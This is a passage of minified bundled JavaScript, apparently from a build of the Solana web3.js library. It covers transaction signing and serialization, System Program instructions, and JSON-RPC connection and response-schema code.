fit",usage:"sort",sensitivity:"variant",ignorePunctuation:!1,numeric:!1,caseFirst:"lower"};return k.pubkey.toBase58().localeCompare(I.pubkey.toBase58(),"en",S)});const a=o.findIndex(k=>k.pubkey.equals(r));if(a>-1){const[k]=o.splice(a,1);k.isSigner=!0,k.isWritable=!0,o.unshift(k)}else o.unshift({pubkey:r,isSigner:!0,isWritable:!0});for(const k of this.signatures){const I=o.findIndex(S=>S.pubkey.equals(k.publicKey));if(I>-1)o[I].isSigner||(o[I].isSigner=!0,console.warn("Transaction references a signature that is unnecessary, only the fee payer and instruction signer accounts should sign a transaction. This behavior is deprecated and will throw an error in the next major version release."));else throw new Error(`unknown signer: ${k.publicKey.toString()}`)}let l=0,u=0,h=0;const f=[],m=[];o.forEach(({pubkey:k,isSigner:I,isWritable:S})=>{I?(f.push(k.toString()),l+=1,S||(u+=1)):(m.push(k.toString()),S||(h+=1))});const v=f.concat(m),x=t.map(k=>{const{data:I,programId:S}=k;return{programIdIndex:v.indexOf(S.toString()),accounts:k.keys.map(b=>v.indexOf(b.pubkey.toString())),data:On.encode(I)}});return x.forEach(k=>{Bt(k.programIdIndex>=0),k.accounts.forEach(I=>Bt(I>=0))}),new as({header:{numRequiredSignatures:l,numReadonlySignedAccounts:u,numReadonlyUnsignedAccounts:h},accountKeys:v,recentBlockhash:e,instructions:x})}_compile(){const e=this.compileMessage(),t=e.accountKeys.slice(0,e.header.numRequiredSignatures);return this.signatures.length===t.length&&this.signatures.every((i,s)=>t[s].equals(i.publicKey))||(this.signatures=t.map(r=>({signature:null,publicKey:r}))),e}serializeMessage(){return this._compile().serialize()}async getEstimatedFee(e){return(await e.getFeeForMessage(this.compileMessage())).value}setSigners(...e){if(e.length===0)throw new Error("No signers");const t=new Set;this.signatures=e.filter(r=>{const i=r.toString();return t.has(i)?!1:(t.add(i),!0)}).map(r=>({signature:null,publicKey:r}))}sign(...e){if(e.length===0)throw new Error("No signers");const t=new Set,r=[];for(const s of e){const o=s.publicKey.toString();t.has(o)||(t.add(o),r.push(s))}this.signatures=r.map(s=>({signature:null,publicKey:s.publicKey}));const i=this._compile();this._partialSign(i,...r)}partialSign(...e){if(e.length===0)throw new Error("No signers");const t=new Set,r=[];for(const s of e){const o=s.publicKey.toString();t.has(o)||(t.add(o),r.push(s))}const i=this._compile();this._partialSign(i,...r)}_partialSign(e,...t){const r=e.serialize();t.forEach(i=>{const s=$b(r,i.secretKey);this._addSignature(i.publicKey,Nn(s))})}addSignature(e,t){this._compile(),this._addSignature(e,t)}_addSignature(e,t){Bt(t.length===64);const r=this.signatures.findIndex(i=>e.equals(i.publicKey));if(r<0)throw new Error(`unknown signer: ${e.toString()}`);this.signatures[r].signature=Le.Buffer.from(t)}verifySignatures(e=!0){return!this._getMessageSignednessErrors(this.serializeMessage(),e)}_getMessageSignednessErrors(e,t){const r={};for(const{signature:i,publicKey:s}of this.signatures)i===null?t&&(r.missing||(r.missing=[])).push(s):ID(i,e,s.toBytes())||(r.invalid||(r.invalid=[])).push(s);return r.invalid||r.missing?r:void 0}serialize(e){const{requireAllSignatures:t,verifySignatures:r}=Object.assign({requireAllSignatures:!0,verifySignatures:!0},e),i=this.serializeMessage();if(r){const s=this._getMessageSignednessErrors(i,t);if(s){let o="Signature verification failed.";throw s.invalid&&(o+=`
Invalid signature for public key${s.invalid.length===1?"":"(s)"} [\`${s.invalid.map(a=>a.toBase58()).join("`, `")}\`].`),s.missing&&(o+=`
Missing signature for public key${s.missing.length===1?"":"(s)"} [\`${s.missing.map(a=>a.toBase58()).join("`, `")}\`].`),new Error(o)}}return this._serialize(i)}_serialize(e){const{signatures:t}=this,r=[];Ar(r,t.length);const i=r.length+t.length*64+e.length,s=Le.Buffer.alloc(i);return Bt(t.length<256),Le.Buffer.from(r).copy(s,0),t.forEach(({signature:o},a)=>{o!==null&&(Bt(o.length===64,"signature has invalid length"),Le.Buffer.from(o).copy(s,r.length+a*64))}),e.copy(s,r.length+t.length*64),Bt(s.length<=dl,`Transaction too large: ${s.length} > ${dl}`),s}get keys(){return Bt(this.instructions.length===1),this.instructions[0].keys.map(e=>e.pubkey)}get programId(){return Bt(this.instructions.length===1),this.instructions[0].programId}get data(){return Bt(this.instructions.length===1),this.instructions[0].data}static from(e){let t=[...e];const r=Tr(t);let i=[];for(let s=0;s<r;s++){const o=br(t,0,Nu);i.push(On.encode(Le.Buffer.from(o)))}return xr.populate(as.from(t),i)}static populate(e,t=[]){const r=new xr;return r.recentBlockhash=e.recentBlockhash,e.header.numRequiredSignatures>0&&(r.feePayer=e.accountKeys[0]),t.forEach((i,s)=>{const o={signature:i==On.encode(MD)?null:On.decode(i),publicKey:e.accountKeys[s]};r.signatures.push(o)}),e.instructions.forEach(i=>{const s=i.accounts.map(o=>{const a=e.accountKeys[o];return{pubkey:a,isSigner:r.signatures.some(l=>l.publicKey.toString()===a.toString())||e.isAccountSigner(o),isWritable:e.isAccountWritable(o)}});r.instructions.push(new Xr({keys:s,programId:e.accountKeys[i.programIdIndex],data:On.decode(i.data)}))}),r._message=e,r._json=r.toJSON(),r}}class Lu{get version(){return this.message.version}constructor(e,t){if(this.signatures=void 0,this.message=void 0,t!==void 0)Bt(t.length===e.header.numRequiredSignatures,"Expected signatures length to be equal to the number of required signatures"),this.signatures=t;else{const r=[];for(let i=0;i<e.header.numRequiredSignatures;i++)r.push(new Uint8Array(Nu));this.signatures=r}this.message=e}serialize(){const e=this.message.serialize(),t=Array();Ar(t,this.signatures.length);const r=ve([Rt(t.length,"encodedSignaturesLength"),er(bD(),this.signatures.length,"signatures"),Rt(e.length,"serializedMessage")]),i=new Uint8Array(2048),s=r.encode({encodedSignaturesLength:new Uint8Array(t),signatures:this.signatures,serializedMessage:e},i);return i.slice(0,s)}static deserialize(e){let t=[...e];const r=[],i=Tr(t);for(let o=0;o<i;o++)r.push(new Uint8Array(br(t,0,Nu)));const s=Gw.deserialize(new Uint8Array(t));return new Lu(s,r)}sign(e){const t=this.message.serialize(),r=this.message.staticAccountKeys.slice(0,this.message.header.numRequiredSignatures);for(const i of e){const s=r.findIndex(o=>o.equals(i.publicKey));Bt(s>=0,`Cannot sign with non signer key ${i.publicKey.toBase58()}`),this.signatures[s]=$b(t,i.secretKey)}}addSignature(e,t){Bt(t.byteLength===64,"Signature must be 64 bytes long");const i=this.message.staticAccountKeys.slice(0,this.message.header.numRequiredSignatures).findIndex(s=>s.equals(e));Bt(i>=0,`Can not add signature; \`${e.toBase58()}\` is not required to sign this transaction`),this.signatures[i]=t}}const ND=160,PD=64,LD=ND/PD,DD=1e3/LD;new Ie("SysvarC1ock11111111111111111111111111111111");new Ie("SysvarEpochSchedu1e111111111111111111111111");new Ie("Sysvar1nstructions1111111111111111111111111");const Jg=new Ie("SysvarRecentB1ockHashes11111111111111111111"),pE=new Ie("SysvarRent111111111111111111111111111111111");new Ie("SysvarRewards111111111111111111111111111111");new Ie("SysvarS1otHashes111111111111111111111111111");new Ie("SysvarS1otHistory11111111111111111111111111");new Ie("SysvarStakeHistory1111111111111111111111111");class gE extends Error{constructor({action:e,signature:t,transactionMessage:r,logs:i}){const s=i?`Logs: 
${JSON.stringify(i.slice(-10),null,2)}. `:"",o="\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.";let a;switch(e){case"send":a=`Transaction ${t} resulted in an error. 
${r}. `+s+o;break;case"simulate":a=`Simulation failed. 
Message: ${r}. 
`+s+o;break;default:a=`Unknown action '${(l=>l)(e)}'`}super(a),this.signature=void 0,this.transactionMessage=void 0,this.transactionLogs=void 0,this.signature=t,this.transactionMessage=r,this.transactionLogs=i||void 0}get transactionError(){return{message:this.transactionMessage,logs:Array.isArray(this.transactionLogs)?this.transactionLogs:void 0}}get logs(){const e=this.transactionLogs;if(!(e!=null&&typeof e=="object"&&"then"in e))return e}async getLogs(e){return Array.isArray(this.transactionLogs)||(this.transactionLogs=new Promise((t,r)=>{e.getTransaction(this.signature).then(i=>{if(i&&i.meta&&i.meta.logMessages){const s=i.meta.logMessages;this.transactionLogs=s,t(s)}else r(new Error("Log messages not found"))}).catch(r)})),await this.transactionLogs}}class Ee extends Error{constructor({code:e,message:t,data:r},i){super(i!=null?`${i}: ${t}`:t),this.code=void 0,this.data=void 0,this.code=e,this.data=r,this.name="SolanaJSONRPCError"}}function Ba(n){return new Promise(e=>setTimeout(e,n))}function Br(n,e){const t=n.layout.span>=0?n.layout.span:Gb(n,e),r=Le.Buffer.alloc(t),i=Object.assign({instruction:n.index},e);return n.layout.encode(i,r),r}const OD=Rn("lamportsPerSignature"),Yb=ve([Ae("version"),Ae("state"),He("authorizedPubkey"),He("nonce"),ve([OD],"feeCalculator")]),mE=Yb.span;class Qw{constructor(e){this.authorizedPubkey=void 0,this.nonce=void 0,this.feeCalculator=void 0,this.authorizedPubkey=e.authorizedPubkey,this.nonce=e.nonce,this.feeCalculator=e.feeCalculator}static fromAccountData(e){const t=Yb.decode(Nn(e),0);return new Qw({authorizedPubkey:new Ie(t.authorizedPubkey),nonce:new Ie(t.nonce).toString(),feeCalculator:t.feeCalculator})}}const BD=n=>{const e=n.decode.bind(n),t=n.encode.bind(n);return{decode:e,encode:t}},UD=n=>e=>{const t=Rt(n,e),{encode:r,decode:i}=BD(t),s=t;return s.decode=(o,a)=>{const l=i(o,a);return wL(Le.Buffer.from(l))},s.encode=(o,a,l)=>{const u=EL(o,n);return r(u,a,l)},s},Cl=UD(8),Ur=Object.freeze({Create:{index:0,layout:ve([Ae("instruction"),Sr("lamports"),Sr("space"),He("programId")])},Assign:{index:1,layout:ve([Ae("instruction"),He("programId")])},Transfer:{index:2,layout:ve([Ae("instruction"),Cl("lamports")])},CreateWithSeed:{index:3,layout:ve([Ae("instruction"),He("base"),nl("seed"),Sr("lamports"),Sr("space"),He("programId")])},AdvanceNonceAccount:{index:4,layout:ve([Ae("instruction")])},WithdrawNonceAccount:{index:5,layout:ve([Ae("instruction"),Sr("lamports")])},InitializeNonceAccount:{index:6,layout:ve([Ae("instruction"),He("authorized")])},AuthorizeNonceAccount:{index:7,layout:ve([Ae("instruction"),He("authorized")])},Allocate:{index:8,layout:ve([Ae("instruction"),Sr("space")])},AllocateWithSeed:{index:9,layout:ve([Ae("instruction"),He("base"),nl("seed"),Sr("space"),He("programId")])},AssignWithSeed:{index:10,layout:ve([Ae("instruction"),He("base"),nl("seed"),He("programId")])},TransferWithSeed:{index:11,layout:ve([Ae("instruction"),Cl("lamports"),nl("seed"),He("programId")])},UpgradeNonceAccount:{index:12,layout:ve([Ae("instruction")])}});class Du{constructor(){}static createAccount(e){const t=Ur.Create,r=Br(t,{lamports:e.lamports,space:e.space,programId:Nn(e.programId.toBuffer())});return new Xr({keys:[{pubkey:e.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:e.newAccountPubkey,isSigner:!0,isWritable:!0}],programId:this.programId,data:r})}static transfer(e){let t,r;if("basePubkey"in e){const i=Ur.TransferWithSeed;t=Br(i,{lamports:BigInt(e.lamports),seed:e.seed,programId:Nn(e.programId.toBuffer())}),r=[{pubkey:e.fromPubkey,isSigner:!1,isWritable:!0},{pubkey:e.basePubkey,isSigner:!0,isWritable:!1},{pubkey:e.toPubkey,isSigner:!1,isWritable:!0}]}else{const i=Ur.Transfer;t=Br(i,{lamports:BigInt(e.lamports)}),r=[{pubkey:e.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:e.toPubkey,isSigner:!1,isWritable:!0}]}return new Xr({keys:r,programId:this.programId,data:t})}static assign(e){let t,r;if("basePubkey"in e){const i=Ur.AssignWithSeed;t=Br(i,{base:Nn(e.basePubkey.toBuffer()),seed:e.seed,programId:Nn(e.programId.toBuffer())}),r=[{pubkey:e.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:e.basePubkey,isSigner:!0,isWritable:!1}]}else{const i=Ur.Assign;t=Br(i,{programId:Nn(e.programId.toBuffer())}),r=[{pubkey:e.accountPubkey,isSigner:!0,isWritable:!0}]}return new Xr({keys:r,programId:this.programId,data:t})}static createAccountWithSeed(e){const t=Ur.CreateWithSeed,r=Br(t,{base:Nn(e.basePubkey.toBuffer()),seed:e.seed,lamports:e.lamports,space:e.space,programId:Nn(e.programId.toBuffer())});let i=[{pubkey:e.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:e.newAccountPubkey,isSigner:!1,isWritable:!0}];return e.basePubkey.equals(e.fromPubkey)||i.push({pubkey:e.basePubkey,isSigner:!0,isWritable:!1}),new Xr({keys:i,programId:this.programId,data:r})}static createNonceAccount(e){const t=new xr;"basePubkey"in e&&"seed"in e?t.add(Du.createAccountWithSeed({fromPubkey:e.fromPubkey,newAccountPubkey:e.noncePubkey,basePubkey:e.basePubkey,seed:e.seed,lamports:e.lamports,space:mE,programId:this.programId})):t.add(Du.createAccount({fromPubkey:e.fromPubkey,newAccountPubkey:e.noncePubkey,lamports:e.lamports,space:mE,programId:this.programId}));const r={noncePubkey:e.noncePubkey,authorizedPubkey:e.authorizedPubkey};return t.add(this.nonceInitialize(r)),t}static nonceInitialize(e){const t=Ur.InitializeNonceAccount,r=Br(t,{authorized:Nn(e.authorizedPubkey.toBuffer())}),i={keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:Jg,isSigner:!1,isWritable:!1},{pubkey:pE,isSigner:!1,isWritable:!1}],programId:this.programId,data:r};return new Xr(i)}static nonceAdvance(e){const t=Ur.AdvanceNonceAccount,r=Br(t),i={keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:Jg,isSigner:!1,isWritable:!1},{pubkey:e.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:r};return new Xr(i)}static nonceWithdraw(e){const t=Ur.WithdrawNonceAccount,r=Br(t,{lamports:e.lamports});return new Xr({keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:e.toPubkey,isSigner:!1,isWritable:!0},{pubkey:Jg,isSigner:!1,isWritable:!1},{pubkey:pE,isSigner:!1,isWritable:!1},{pubkey:e.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:r})}static nonceAuthorize(e){const t=Ur.AuthorizeNonceAccount,r=Br(t,{authorized:Nn(e.newAuthorizedPubkey.toBuffer())});return new Xr({keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:e.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:r})}static allocate(e){let t,r;if("basePubkey"in e){const i=Ur.AllocateWithSeed;t=Br(i,{base:Nn(e.basePubkey.toBuffer()),seed:e.seed,space:e.space,programId:Nn(e.programId.toBuffer())}),r=[{pubkey:e.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:e.basePubkey,isSigner:!0,isWritable:!1}]}else{const i=Ur.Allocate;t=Br(i,{space:e.space}),r=[{pubkey:e.accountPubkey,isSigner:!0,isWritable:!0}]}return new Xr({keys:r,programId:this.programId,data:t})}}Du.programId=new Ie("11111111111111111111111111111111");new Ie("BPFLoader2111111111111111111111111111111111");function jD(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}var Xg,yE;function VD(){if(yE)return Xg;yE=1;var n=Object.prototype.toString,e=Object.keys||function(r){var i=[];for(var s in r)i.push(s);return i};function t(r,i){var s,o,a,l,u,h,f;if(r===!0)return"true";if(r===!1)return"false";switch(typeof r){case"object":if(r===null)return null;if(r.toJSON&&typeof r.toJSON=="function")return t(r.toJSON(),i);if(f=n.call(r),f==="[object Array]"){for(a="[",o=r.length-1,s=0;s<o;s++)a+=t(r[s],!0)+",";return o>-1&&(a+=t(r[s],!0)),a+"]"}else if(f==="[object Object]"){for(l=e(r).sort(),o=l.length,a="",s=0;s<o;)u=l[s],h=t(r[u],!1),h!==void 0&&(a&&(a+=","),a+=JSON.stringify(u)+":"+h),s++;return"{"+a+"}"}else return JSON.stringify(r);case"function":case"undefined":return i?null:void 0;case"string":return JSON.stringify(r);default:return isFinite(r)?r:null}}return Xg=function(r){var i=t(r,!1);if(i!==void 0)return""+i},Xg}var FD=VD(),wE=jD(FD);const Mc=32;function em(n){let e=0;for(;n>1;)n/=2,e++;return e}function zD(n){return n===0?1:(n--,n|=n>>1,n|=n>>2,n|=n>>4,n|=n>>8,n|=n>>16,n|=n>>32,n+1)}class WD{constructor(e,t,r,i,s){this.slotsPerEpoch=void 0,this.leaderScheduleSlotOffset=void 0,this.warmup=void 0,this.firstNormalEpoch=void 0,this.firstNormalSlot=void 0,this.slotsPerEpoch=e,this.leaderScheduleSlotOffset=t,this.warmup=r,this.firstNormalEpoch=i,this.firstNormalSlot=s}getEpoch(e){return this.getEpochAndSlotIndex(e)[0]}getEpochAndSlotIndex(e){if(e<this.firstNormalSlot){const t=em(zD(e+Mc+1))-em(Mc)-1,r=this.getSlotsInEpoch(t),i=e-(r-Mc);return[t,i]}else{const t=e-this.firstNormalSlot,r=Math.floor(t/this.slotsPerEpoch),i=this.firstNormalEpoch+r,s=t%this.slotsPerEpoch;return[i,s]}}getFirstSlotInEpoch(e){return e<=this.firstNormalEpoch?(Math.pow(2,e)-1)*Mc:(e-this.firstNormalEpoch)*this.slotsPerEpoch+this.firstNormalSlot}getLastSlotInEpoch(e){return this.getFirstSlotInEpoch(e)+this.getSlotsInEpoch(e)-1}getSlotsInEpoch(e){return e<this.firstNormalEpoch?Math.pow(2,e+em(Mc)):this.slotsPerEpoch}}var $D=globalThis.fetch;class HD extends cD{constructor(e,t,r){const i=s=>{const o=aD(s,{autoconnect:!0,max_reconnects:5,reconnect:!0,reconnect_interval:1e3,...t});return"socket"in o?this.underlyingSocket=o.socket:this.underlyingSocket=o,o};super(i,e,t,r),this.underlyingSocket=void 0}call(...e){var r;const t=(r=this.underlyingSocket)==null?void 0:r.readyState;return t===1?super.call(...e):Promise.reject(new Error("Tried to call a JSON-RPC method `"+e[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+t+")"))}notify(...e){var r;const t=(r=this.underlyingSocket)==null?void 0:r.readyState;return t===1?super.notify(...e):Promise.reject(new Error("Tried to send a JSON-RPC notification `"+e[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+t+")"))}}function qD(n,e){let t;try{t=n.layout.decode(e)}catch(r){throw new Error("invalid instruction; "+r)}if(t.typeIndex!==n.index)throw new Error(`invalid account data; account type mismatch ${t.typeIndex} != ${n.index}`);return t}const vE=56;class _E{constructor(e){this.key=void 0,this.state=void 0,this.key=e.key,this.state=e.state}isActive(){const e=BigInt("0xffffffffffffffff");return this.state.deactivationSlot===e}static deserialize(e){const t=qD(KD,e),r=e.length-vE;Bt(r>=0,"lookup table is invalid"),Bt(r%32===0,"lookup table is invalid");const i=r/32,{addresses:s}=ve([er(He(),i,"addresses")]).decode(e.slice(vE));return{deactivationSlot:t.deactivationSlot,lastExtendedSlot:t.lastExtendedSlot,lastExtendedSlotStartIndex:t.lastExtendedStartIndex,authority:t.authority.length!==0?new Ie(t.authority[0]):void 0,addresses:s.map(o=>new Ie(o))}}}const KD={index:1,layout:ve([Ae("typeIndex"),Cl("deactivationSlot"),Rn("lastExtendedSlot"),it("lastExtendedStartIndex"),it(),er(He(),Qo(it(),-1),"authority")])},GD=/^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i;function QD(n){const e=n.match(GD);if(e==null)throw TypeError(`Failed to validate endpoint URL \`${n}\``);const[t,r,i,s]=e,o=n.startsWith("https:")?"wss:":"ws:",a=i==null?null:parseInt(i.slice(1),10),l=a==null?"":`:${a+1}`;return`${o}//${r}${l}${s}`}const Gt=oh(Hw(Ie),ue(),n=>new Ie(n)),Zb=qw([ue(),$t("base64")]),Yw=oh(Hw(Le.Buffer),Zb,n=>Le.Buffer.from(n[0],"base64")),YD=30*1e3;function ZD(n){if(/^https?:/.test(n)===!1)throw new TypeError("Endpoint URL must start with `http:` or `https:`.");return n}function St(n){let e,t;if(typeof n=="string")e=n;else if(n){const{commitment:r,...i}=n;e=r,t=i}return{commitment:e,config:t}}function EE(n){return n.map(e=>"memcmp"in e?{...e,memcmp:{...e.memcmp,encoding:e.memcmp.encoding??"base58"}}:e)}function Jb(n){return ar([se({jsonrpc:$t("2.0"),id:ue(),result:n}),se({jsonrpc:$t("2.0"),id:ue(),error:se({code:Zl(),message:ue(),data:be(CL())})})])}const JD=Jb(Zl());function ze(n){return oh(Jb(n),JD,e=>"error"in e?e:{...e,result:de(e.result,n)})}function tn(n){return ze(se({context:se({slot:J()}),value:n}))}function Ap(n){return se({context:se({slot:J()}),value:n})}function tm(n,e){return n===0?new Pu({header:e.header,staticAccountKeys:e.accountKeys.map(t=>new Ie(t)),recentBlockhash:e.recentBlockhash,compiledInstructions:e.instructions.map(t=>({programIdIndex:t.programIdIndex,accountKeyIndexes:t.accounts,data:On.decode(t.data)})),addressTableLookups:e.addressTableLookups}):new as(e)}const XD=se({foundation:J(),foundationTerm:J(),initial:J(),taper:J(),terminal:J()}),eO=ze(pe(ge(se({epoch:J(),effectiveSlot:J(),amount:J(),postBalance:J(),commission:be(ge(J()))})))),tO=pe(se({slot:J(),prioritizationFee:J()})),nO=se({total:J(),validator:J(),foundation:J(),epoch:J()}),rO=se({epoch:J(),slotIndex:J(),slotsInEpoch:J(),absoluteSlot:J(),blockHeight:be(J()),transactionCount:be(J())}),iO=se({slotsPerEpoch:J(),leaderScheduleSlotOffset:J(),warmup:ki(),firstNormalEpoch:J(),firstNormalSlot:J()}),sO=Pb(ue(),pe(J())),ma=ge(ar([se({}),ue()])),oO=se({err:ma}),aO=$t("receivedSignature"),lO=se({"solana-core":ue(),"feature-set":be(J())}),cO=se({program:ue(),programId:Gt,parsed:Zl()}),uO=se({programId:Gt,accounts:pe(Gt),data:ue()}),IE=tn(se({err:ge(ar([se({}),ue()])),logs:ge(pe(ue())),accounts:be(ge(pe(ge(se({executable:ki(),owner:ue(),lamports:J(),data:pe(ue()),rentEpoch:be(J())}))))),unitsConsumed:be(J()),returnData:be(ge(se({programId:ue(),data:qw([ue(),$t("base64")])}))),innerInstructions:be(ge(pe(se({index:J(),instructions:pe(ar([cO,uO]))}))))})),hO=tn(se({byIdentity:Pb(ue(),pe(J())),range:se({firstSlot:J(),lastSlot:J()})}));function fO(n,e,t,r,i,s){const o=t||$D;let a;s!=null&&console.warn("You have supplied an `httpAgent` when creating a `Connection` in a browser environment.It has been ignored; `httpAgent` is only used in Node environments.");let l;return r&&(l=async(h,f)=>{const m=await new Promise((v,x)=>{try{r(h,f,(k,I)=>v([k,I]))}catch(k){x(k)}});return await o(...m)}),new iD(async(h,f)=>{const m={method:"POST",body:h,agent:a,headers:Object.assign({"Content-Type":"application/json"},e||{},f3)};try{let v=5,x,k=500;for(;l?x=await l(n,m):x=await o(n,m),!(x.status!==429||i===!0||(v-=1,v===0));)console.error(`Server responded with ${x.status} ${x.statusText}.  Retrying after ${k}ms delay...`),await Ba(k),k*=2;const I=await x.text();x.ok?f(null,I):f(new Error(`${x.status} ${x.statusText}: ${I}`))}catch(v){v instanceof Error&&f(v)}},{})}function dO(n){return(e,t)=>new Promise((r,i)=>{n.request(e,t,(s,o)=>{if(s){i(s);return}r(o)})})}function pO(n){return e=>new Promise((t,r)=>{e.length===0&&t([]);const i=e.map(s=>n.request(s.methodName,s.args));n.request(i,(s,o)=>{if(s){r(s);return}t(o)})})}const gO=ze(XD),mO=ze(nO),yO=ze(tO),wO=ze(rO),vO=ze(iO),_O=ze(sO),EO=ze(J()),IO=tn(se({total:J(),circulating:J(),nonCirculating:J(),nonCirculatingAccounts:pe(Gt)})),L0=se({amount:ue(),uiAmount:ge(J()),decimals:J(),uiAmountString:be(ue())}),SO=tn(pe(se({address:Gt,amount:ue(),uiAmount:ge(J()),decimals:J(),uiAmountString:be(ue())}))),TO=tn(pe(se({pubkey:Gt,account:se({executable:ki(),owner:Gt,lamports:J(),data:Yw,rentEpoch:J()})}))),D0=se({program:ue(),parsed:Zl(),space:J()}),AO=tn(pe(se({pubkey:Gt,account:se({executable:ki(),owner:Gt,lamports:J(),data:D0,rentEpoch:J()})}))),bO=tn(pe(se({lamports:J(),address:Gt}))),Ou=se({executable:ki(),owner:Gt,lamports:J(),data:Yw,rentEpoch:J()}),xO=se({pubkey:Gt,account:Ou}),kO=oh(ar([Hw(Le.Buffer),D0]),ar([Zb,D0]),n=>Array.isArray(n)?de(n,Yw):n),O0=se({executable:ki(),owner:Gt,lamports:J(),data:kO,rentEpoch:J()}),CO=se({pubkey:Gt,account:O0}),RO=se({state:ar([$t("active"),$t("inactive"),$t("activating"),$t("deactivating")]),active:J(),inactive:J()}),MO=ze(pe(se({signature:ue(),slot:J(),err:ma,memo:ge(ue()),blockTime:be(ge(J()))}))),NO=ze(pe(se({signature:ue(),slot:J(),err:ma,memo:ge(ue()),blockTime:be(ge(J()))}))),PO=se({subscription:J(),result:Ap(Ou)}),LO=se({pubkey:Gt,account:Ou}),DO=se({subscription:J(),result:Ap(LO)}),OO=se({parent:J(),slot:J(),root:J()}),BO=se({subscription:J(),result:OO}),UO=ar([se({type:ar([$t("firstShredReceived"),$t("completed"),$t("optimisticConfirmation"),$t("root")]),slot:J(),timestamp:J()}),se({type:$t("createdBank"),parent:J(),slot:J(),timestamp:J()}),se({type:$t("frozen"),slot:J(),timestamp:J(),stats:se({numTransactionEntries:J(),numSuccessfulTransactions:J(),numFailedTransactions:J(),maxTransactionsPerEntry:J()})}),se({type:$t("dead"),slot:J(),timestamp:J(),err:ue()})]),jO=se({subscription:J(),result:UO}),VO=se({subscription:J(),result:Ap(ar([oO,aO]))}),FO=se({subscription:J(),result:J()}),zO=se({pubkey:ue(),gossip:ge(ue()),tpu:ge(ue()),rpc:ge(ue()),version:ge(ue())}),SE=se({votePubkey:ue(),nodePubkey:ue(),activatedStake:J(),epochVoteAccount:ki(),epochCredits:pe(qw([J(),J(),J()])),commission:J(),lastVote:J(),rootSlot:ge(J())}),WO=ze(se({current:pe(SE),delinquent:pe(SE)})),$O=ar([$t("processed"),$t("confirmed"),$t("finalized")]),HO=se({slot:J(),confirmations:ge(J()),err:ma,confirmationStatus:be($O)}),qO=tn(pe(ge(HO))),KO=ze(J()),Xb=se({accountKey:Gt,writableIndexes:pe(J()),readonlyIndexes:pe(J())}),Zw=se({signatures:pe(ue()),message:se({accountKeys:pe(ue()),header:se({numRequiredSignatures:J(),numReadonlySignedAccounts:J(),numReadonlyUnsignedAccounts:J()}),instructions:pe(se({accounts:pe(J()),data:ue(),programIdIndex:J()})),recentBlockhash:ue(),addressTableLookups:be(pe(Xb))})}),ex=se({pubkey:Gt,signer:ki(),writable:ki(),source:be(ar([$t("transaction"),$t("lookupTable")]))}),tx=se({accountKeys:pe(ex),signatures:pe(ue())}),nx=se({parsed:Zl(),program:ue(),programId:Gt}),rx=se({accounts:pe(Gt),data:ue(),programId:Gt}),GO=ar([rx,nx]),QO=ar([se({parsed:Zl(),program:ue(),programId:ue()}),se({accounts:pe(ue()),data:ue(),programId:ue()})]),ix=oh(GO,QO,n=>"accounts"in n?de(n,rx):de(n,nx)),sx=se({signatures:pe(ue()),message:se({accountKeys:pe(ex),instructions:pe(ix),recentBlockhash:ue(),addressTableLookups:be(ge(pe(Xb)))})}),_d=se({accountIndex:J(),mint:ue(),owner:be(ue()),programId:be(ue()),uiTokenAmount:L0}),ox=se({writable:pe(Gt),readonly:pe(Gt)}),bp=se({err:ma,fee:J(),innerInstructions:be(ge(pe(se({index:J(),instructions:pe(se({accounts:pe(J()),data:ue(),programIdIndex:J()}))})))),preBalances:pe(J()),postBalances:pe(J()),logMessages:be(ge(pe(ue()))),preTokenBalances:be(ge(pe(_d))),postTokenBalances:be(ge(pe(_d))),loadedAddresses:be(ox),computeUnitsConsumed:be(J())}),Jw=se({err:ma,fee:J(),innerInstructions:be(ge(pe(se({index:J(),instructions:pe(ix)})))),preBalances:pe(J()),postBalances:pe(J()),logMessages:be(ge(pe(ue()))),preTokenBalances:be(ge(pe(_d))),postTokenBalances:be(ge(pe(_d))),loadedAddresses:be(ox),computeUnitsConsumed:be(J())}),Jl=ar([$t(0),$t("legacy")]),ya=se({pubkey:ue(),lamports:J(),postBalance:ge(J()),rewardType:ge(ue()),commission:be(ge(J()))}),YO=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),transactions:pe(se({transaction:Zw,meta:ge(bp),version:be(Jl)})),rewards:be(pe(ya)),blockTime:ge(J()),blockHeight:ge(J())}))),ZO=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),rewards:be(pe(ya)),blockTime:ge(J()),blockHeight:ge(J())}))),JO=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),transactions:pe(se({transaction:tx,meta:ge(bp),version:be(Jl)})),rewards:be(pe(ya)),blockTime:ge(J()),blockHeight:ge(J())}))),XO=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),transactions:pe(se({transaction:sx,meta:ge(Jw),version:be(Jl)})),rewards:be(pe(ya)),blockTime:ge(J()),blockHeight:ge(J())}))),e3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),transactions:pe(se({transaction:tx,meta:ge(Jw),version:be(Jl)})),rewards:be(pe(ya)),blockTime:ge(J()),blockHeight:ge(J())}))),t3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),rewards:be(pe(ya)),blockTime:ge(J()),blockHeight:ge(J())}))),n3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:J(),transactions:pe(se({transaction:Zw,meta:ge(bp)})),rewards:be(pe(ya)),blockTime:ge(J())}))),TE=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentS